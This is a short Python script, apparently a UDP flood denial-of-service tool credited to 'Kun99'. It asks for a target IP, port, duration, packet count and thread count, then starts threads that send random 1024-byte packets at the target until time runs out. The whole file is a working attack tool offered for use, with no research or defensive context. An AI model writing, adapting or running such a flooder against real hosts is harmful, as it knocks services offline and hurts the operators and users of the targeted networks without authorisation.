import socket
import threading
import os
import sys
import time
import random

# Clear terminal screen
os.system('clear')

# Function to display banner
def display_banner():
    banner = """
     ____   ____  ___  ____     ___       __
     | ::   | :: | :: | :::     :::      / :
     | ::   | :: | :: | :: :: :: ::     / :::
     | ::::::::: | :: | :: | : | ::    / :: ::
     | ::   | :: | :: | ::  \  | ::   / :::::::
     | ::   | :: | :: | ::     | ::  / ::   \ ::
      \___   \__  \__ \__      \___ /___     |___
    |————————————————————————————————————————————|
      ♥️| PANJANG UMUR PERJUANGAN  ** By:Kun99 |♥️
    """
    print(banner)

# Prompt user for input
def get_user_input():
    print(" +======================================================+")
    target_ip = input(" | Target IP : ").strip()
    target_port = input(" | Target Port : ").strip()
    attack_time = input(" | Time (seconds) : ").strip()
    packet = input(" | Packet : ").strip()
    thread_count = input(" | Thread : ").strip()
    method = input(" | Method (UDP/TCP & UDP Mix) : ").strip().lower()
    print(" ========================================================")

    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method

# Display input summary after user provides inputs
def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
    display_banner()  # Show the banner again
    print(" +======================================================+")
    print(f" | Target IP : {target_ip:<40}|")
    print(f" | Target Port : {target_port:<40}|")
    print(f" | Time : {attack_time:<40}|")
    print(f" | Packet : {packet:<45}|")
    print(f" | Thread : {thread_count:<45}|")
    print(f" | Method (UDP/TCP & UDP Mix) : {method:<25}|")
    print(" ========================================================")

# UDP attack function
def udp_attack(ip, port, packet, duration, thread_count):
    timeout = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)

    while time.time() < timeout:
        try:
            for _ in range(packet):
                s.sendto(data, (ip, port))
            print(f"[HIMAWARI] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
        except socket.error:
            s.close()
            print("[HIMAWARY] Error during attack, socket closed.")
            break

# Threaded attack function
def start_attack(target_ip, target_port, packet, thread_count, method, duration):
    if method == 'udp':
        for _ in range(thread_count):
            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
            th.start()
    else:
        print("[HIMAWARY] Unsupported method. Only UDP supported in this version.")

# Main program flow
def main():
    display_banner()  # Show the banner initially
    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)

    # Start attack
    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[HIMAWARY] Attack interrupted. Exiting...")
        sys.exit()

